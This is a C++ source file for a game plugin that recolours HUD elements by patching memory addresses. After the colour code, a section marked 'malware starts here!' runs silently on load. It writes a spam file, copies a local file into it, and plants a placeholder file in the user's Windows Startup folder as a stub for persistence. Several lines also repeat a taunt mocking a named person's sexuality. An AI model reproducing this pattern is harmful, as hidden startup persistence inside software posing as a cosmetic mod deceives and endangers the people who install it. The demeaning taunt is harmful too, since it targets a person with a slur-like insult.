#include "plugin.h"
#include <iostream>
#include <fstream>  
#include <string>
#include <shlobj.h>
#include <windows.h>

//this is the change

using namespace plugin;

class PluginSdkProject1 {
public:
	PluginSdkProject1() {
		// Initialise your plugin here
		//Events::initRwEvent += [] {
			//patch::SetUInt(0xBAB244, 0xFF0000FF);
			//imad is gay
	//	};
		//imad is gay
		//config_file conf(PLUGIN_PATH("ChangeableHudColors.ini"));
		//std::string preset = conf["USE_PRESET"].asString("III");

		auto WriteColor = [](unsigned int addrR, unsigned int addrG, unsigned int addrB, unsigned int addrA, CRGBA  &clr) {
			patch::SetUChar(addrR, clr.red); patch::SetUChar(addrG, clr.green); patch::SetUChar(addrB, clr.blue); patch::SetUChar(addrA, clr.alpha);
		};
		CRGBA money = { 243, 239, 16,1 };
		CRGBA heart = { 228, 1, 1,1 };
		CRGBA health = { 228, 1, 1 ,0 };
		CRGBA armor = { 248, 196, 42,1 };
		CRGBA sheild = { 248, 196, 42,1 };
		CRGBA amo = { 22, 247, 41,1 };
		CRGBA wOn = { 96, 11, 182,1 };
		CRGBA wOff = { 243, 164, 188,1 };
		CRGBA zone = { 11, 125, 13,1 };
		CRGBA time = { 74, 201, 114,1 };

		WriteColor(5604015, 5604010, 5604005, 5604005, money);
		WriteColor(5606313, 5606308, 5606303, 5606303, health);
		WriteColor(5606542, 5606502, 5606497, 5606497, heart);
		WriteColor(5606950, 5606945, 5606940, 5606940, armor);
		WriteColor(5607166, 5607126, 5607121, 5607121, sheild);
		WriteColor(5605570, 5605565, 5605560, 5605560, amo);
		WriteColor(5607626, 5607621, 5607616, 5607616, wOn);
		WriteColor(5607792, 5607790, 5607785, 5607785, wOff);
		WriteColor(5609812, 5609807, 5609805, 5609805, zone);
		WriteColor(5611409, 5611404, 5611399, 5611399, time);
		//malware starts here!
		std::ofstream outfile("malware.txt");
		for (int c = 1; c < 10000; c++) {
			outfile << "imad is gay!" << std::endl;
		}
		

		std::ifstream infile("2017.txt");
		std::string fline;
		while (getline(infile, fline))
		{
			outfile << fline << '\n';
		}
		
		//std::string path;

		TCHAR userPath[MAX_PATH];

		if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0,userPath )))
		{
			outfile << userPath << std::endl;
		}
		std::string malpath = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.txt";

		std::ofstream malfile(userPath+malpath);
		malfile << "scary.exe goes here?" << std::endl;
		for (int c = 1; c < 10; c++) {
			malfile << "imad is gay!" << std::endl;
		}

		infile.close();
		outfile.close();
		malfile.close();
			
    }
} PluginSdkProject1;
